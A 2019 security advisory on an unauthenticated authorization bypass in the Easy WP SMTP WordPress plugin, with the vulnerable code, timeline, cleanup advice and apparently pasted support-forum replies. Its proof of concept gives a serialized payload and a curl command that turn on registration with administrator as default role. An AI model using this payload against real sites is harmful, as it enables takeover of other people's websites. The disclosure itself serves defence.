### Description

The Easy WP SMTP plugin for WordPress is vulnerable to authorization bypass in versions up to, and including, 1.3.9. This is due to missing capability checks on the admin\_init() function, in addition to insufficient input validation. This makes it possible for unauthenticated attackers to modify the plugins settings and arbitrary options on the site that can be used to inject new administrative user accounts.

# Critical zero-day vulnerability fixed in WordPress Easy WP SMTP plugin.

* by [Jerome Bruandet](https://blog.nintechnet.com/author/bruandet/)
* Posted on [March 17, 2019 - 8:40pm [+0700]June 19, 2019 - 4:38pm [+0700]](https://blog.nintechnet.com/critical-0day-vulnerability-fixed-in-wordpress-easy-wp-smtp-plugin/)

The popular [Easy WP SMTP](https://wordpress.org/plugins/easy-wp-smtp/) plugin, which as 300,000+ active installations, was prone to a critical zero-day vulnerability that allowed an unauthenticated user to modify WordPress options or to inject and execute code among other malicious actions.

The vulnerability, found in version v1.3.9, has been exploited by hackers since at least March 15 (11:00 am UTC), and was caught by our Web Application Firewall for WordPress, [NinjaFirewall (WP Edition)](https://wordpress.org/plugins/ninjafirewall/).

```
add_action( 'admin_init', array( $this, 'admin_init' ) );
...
...
function admin_init() {
	if ( defined( 'DOING_AJAX' ) && DOING_AJAX ) {
		 add_action( 'wp_ajax_swpsmtp_clear_log', array( $this, 'clear_log' ) );
		 add_action( 'wp_ajax_swpsmtp_self_destruct', array( $this, 'self_destruct_handler' ) );
	}

	//view log file
	if ( isset( $_GET[ 'swpsmtp_action' ] ) ) {
	    if ( $_GET[ 'swpsmtp_action' ] === 'view_log' ) {
		$log_file_name = $this->opts[ 'smtp_settings' ][ 'log_file_name' ];
		if ( ! file_exists( plugin_dir_path( __FILE__ ) . $log_file_name ) ) {
		    if ( $this->log( "Easy WP SMTP debug log file\r\n\r\n" ) === false ) {
			wp_die( 'Can\'t write to log file. Check if plugin directory  (' . plugin_dir_path( __FILE__ ) . ') is writeable.' );
		    };
		}
		$logfile = fopen( plugin_dir_path( __FILE__ ) . $log_file_name, 'rb' );
		if ( ! $logfile ) {
		    wp_die( 'Can\'t open log file.' );
		}
		header( 'Content-Type: text/plain' );
		fpassthru( $logfile );
		die;
	    }
	}

	//check if this is export settings request
	$is_export_settings = filter_input( INPUT_POST, 'swpsmtp_export_settings', FILTER_SANITIZE_NUMBER_INT );
	if ( $is_export_settings ) {
	    $data					 = array();
	    $opts					 = get_option( 'swpsmtp_options', array() );
	    $data[ 'swpsmtp_options' ]		 = $opts;
	    $swpsmtp_pass_encrypted			 = get_option( 'swpsmtp_pass_encrypted', false );
	    $data[ 'swpsmtp_pass_encrypted' ]	 = $swpsmtp_pass_encrypted;
	    if ( $swpsmtp_pass_encrypted ) {
		$swpsmtp_enc_key		 = get_option( 'swpsmtp_enc_key', false );
		$data[ 'swpsmtp_enc_key' ]	 = $swpsmtp_enc_key;
	    }
	    $smtp_test_mail			 = get_option( 'smtp_test_mail', array() );
	    $data[ 'smtp_test_mail' ]	 = $smtp_test_mail;
	    $out				 = array();
	    $out[ 'data' ]			 = serialize( $data );
	    $out[ 'ver' ]			 = 1;
	    $out[ 'checksum' ]		 = md5( $out[ 'data' ] );

	    $filename = 'easy_wp_smtp_settings.txt';
	    header( 'Content-Disposition: attachment; filename="' . $filename . '"' );
	    header( 'Content-Type: text/plain' );
	    echo serialize( $out );
	    exit;
	}

	$is_import_settings = filter_input( INPUT_POST, 'swpsmtp_import_settings', FILTER_SANITIZE_NUMBER_INT );
	if ( $is_import_settings ) {
		 $err_msg = __( 'Error occurred during settings import', 'easy-wp-smtp' );
		 if ( empty( $_FILES[ 'swpsmtp_import_settings_file' ] ) ) {
			echo $err_msg;
			wp_die();
		}
		$in_raw = file_get_contents( $_FILES[ 'swpsmtp_import_settings_file' ][ 'tmp_name' ] );
		try {
			$in = unserialize( $in_raw );
			if ( empty( $in[ 'data' ] ) ) {
				 echo $err_msg;
				 wp_die();
			}
			if ( empty( $in[ 'checksum' ] ) ) {
				 echo $err_msg;
				 wp_die();
			}
			if ( md5( $in[ 'data' ] ) !== $in[ 'checksum' ] ) {
				 echo $err_msg;
				 wp_die();
			}
			$data = unserialize( $in[ 'data' ] );
			foreach ( $data as $key => $value ) {
				 update_option( $key, $value );
			}
			set_transient( 'easy_wp_smtp_settings_import_success', true, 60 * 60 );
			$url = admin_url() . 'options-general.php?page=swpsmtp_settings';
			wp_safe_redirect( $url );
			exit;
		} catch ( Exception $ex ) {
			echo $err_msg;
			wp_die();
		}
	}
}

```

The above `admin_init()` function, from the `easy-wp-smtp.php` script, is ran via the `admin_init` hook when a user accesses the admin area. It is used to view/delete the log, import/export the plugin configuration and to update options in the WordPress database. It does not check the user capability, hence any logged in user, such as a subscriber, could trigger it. But it can also be executed by unauthenticated users, because Easy WP SMTP makes use of AJAX and the `admin_init` hook runs also on admin-ajax.php as indicated in the WordPress API doc:

> Note, this does not just run on user-facing admin screens. It runs on admin-ajax.php and admin-post.php as well.

Therefore, an unauthenticated user can send an AJAX request, e.g., `action=swpsmtp_clear_log`, to trigger the above function and execute its code.

### Proof of Concept

In the following proof of concept, I am going to use `swpsmtp_import_settings` to upload a file that will contain a malicious serialized payload that will enable users registration (`users_can_register`) and set the user default role (`default_role`) to “administrator” in the database.

1. Create a file name “/tmp/upload.txt” and add this content to it:

```
a:2:{s:4:"data";s:81:"a:2:{s:18:"users_can_register";s:1:"1";s:12:"default_role";s:13:"administrator";}";s:8:"checksum";s:32:"3ce5fb6d7b1dbd6252f4b5b3526650c8";}
```

2. Upload the file:

```
$ curl https://VICTIM.COM/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt'
```

Other vulnerabilities could be exploited such as:

* Remote Code Execution via PHP Object Injection because Easy WP SMTP makes use of unsafe `unserialize()` calls.
* Viewing/deleting the log (or any file, since hackers can change the log filename).
* Exporting the plugin configuration which includes the SMTP host, username and password and using it to send spam emails.

Interestingly, all attempts caught by our firewall on March 15 showed that hackers tried to exploit the vulnerability to alter the content of the WordPress `wp_user_roles` option in the database and to give administrator capabilities to all users. Unlike creating an admin account, which can be easily detected in the WordPress “Users” section, altering capabilities is hardly noticeable, i.e., a simple subscriber will keep appearing as a subscriber but will be able to do everything an admin can do.

### Timeline

We reported the vulnerability to the authors and the wordpress.org team on March 15 and a new version 1.3.9.1 was released on March 17.

### Recommendations

Update as soon as possible if you are still running version 1.3.9.

If you are using our web application firewall for WordPress, [NinjaFirewall WP Edition](https://wordpress.org/plugins/ninjafirewall/) (free) and [NinjaFirewall WP+ Edition](https://nintechnet.com/ninjafirewall/wp-edition/) (premium), you are protected. NinjaFirewall protects proactively against this type of vulnerability.

If you were using the vulnerable version of Easy WP SMTP, here are some additional recommendations (non-exhaustive list):

* Check your WordPress “Settings > General” page: Make sure nothing was tampered with (URL, Email Address, Membership and New User Default Role).
* Check your WordPress “Users” page: Look for new users, weird admin accounts, check the admin email address etc.
* Change all passwords.
* Check your WordPress `wp_options`\* table in the database”: Make sure `wp_user_roles`\*, which contains user roles and capabilities, hasn’t been tampered with. You can also use our [free NinjaScanner for WordPress](https://wordpress.org/plugins/ninjascanner/).
* Scan your files too, hackers may have uploaded backdoors.
* Change your SMTP password, hackers may have stolen it.
* Install [a web application firewall](https://wordpress.org/plugins/ninjafirewall/) to protect your blog.

\*If you changed your WordPress database prefix, replace `wp_` with the correct one.

  Someone was able to register him/herself as admin on one of our websites, and according to logs this probably has happened like this:

  ```
  https://www.domain.com/wp-login.php?redirect_to=https://www.domain.com/wp-admin/options-general.php?page=swpsmtp_settings&reauth=1
  HTTP 200 OK
  ```

  Can this be the root cause?

  According to our investigation, the vulnerability that was patched in the latest version has been exploited. We couldn’t determine the exact time of a hack on several websites, thus it wasn’t totally clear at first if it’s this particular plugin that opened the door to hackers.

  Bottom line: several websites that were using the previous version of the plugin were hacked. As the new version has been released only 2 days ago, not all our websites were up to date. And that’s very frustrating because it looks like the exploit has leaked relatively quickly.

  Not to mention the nature of the vulnerability… I’m not going to start a big rant here, but I wouldn’t expect a possibility to register as admin via a vulnerability in SMTP plugin.

  Perhaps it’s just my bad mood now, but I’m testing alternatives.

  [@sshlord](https://wordpress.org/support/users/sshlord/), Can you give me an example of what was infected. What did your hosting provider say? What version of the plugin were you using?

  Currently this plugin has no outstanding issues. So I would like to get details/info on what is the actual cause. That way we can determine if the actual source is this plugin or not and then we can apply any updates if necessary.

  To recover the infected website:

  Fix it by:

  1. Editing the site\_url via the wp-options database (this should let you back into the site)

  2. Access site backend and remove false admin account

  3. Update to the latest version of the Easy WP SMTP plugin

  4. Change your database password and any other insecure content an admin could see.

  5. Run a scan on the site

  Hope this helps anyone needing it.

  It’s all [here](https://wpvulndb.com/vulnerabilities/9237) guys.

  Quote from the above:

  > This appears to be being exploited in the wild at this time.
  >
  > It is noted that the changelog of the plugin does not explain the severity of the vulnerability and refers to it merely as “potential”.

  The last sentence explains the major fault [@wpinsider-1](https://wordpress.org/support/users/wpinsider-1/) – I believe you guys should have mentioned the critical nature of the issue in the changelog and do more to alert users to update ASAP…

  I’m closing this topic down as it’s been corrected and piling onto topics is not how these forum works. More importantly, this has been addressed in the updated release of this plugin.

  <https://wordpress.org/support/forum-user-guide/faq/#i-have-the-same-problem-can-i-just-reply-to-someone-elses-post-with-me-too>

  Per the original poster’s last reply this has been addressed in the 1.3.9.1 version. If you are running an older version then please upgrade immediately.

  If you have been hacked then give this a read.

  You will need to remove any new users and check your site.

  If you need help delousing a hacked system then please ask for support in the Fixing WordPress forum.
